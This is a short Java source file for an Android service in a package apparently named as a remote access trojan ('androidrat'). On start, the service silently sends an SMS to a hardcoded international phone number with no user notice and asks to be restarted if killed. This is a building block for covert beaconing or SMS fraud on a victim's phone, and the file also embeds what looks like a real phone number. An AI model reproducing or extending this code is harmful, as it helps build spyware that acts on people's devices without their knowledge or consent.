package com.ot.androidrat;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class SMSService extends Service {

    public SMSService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String phoneNo = "+2348185571169", message = "test";
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNo, null, message, null, null);
        Log.d("SMS Service", "SMS sent successfully");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}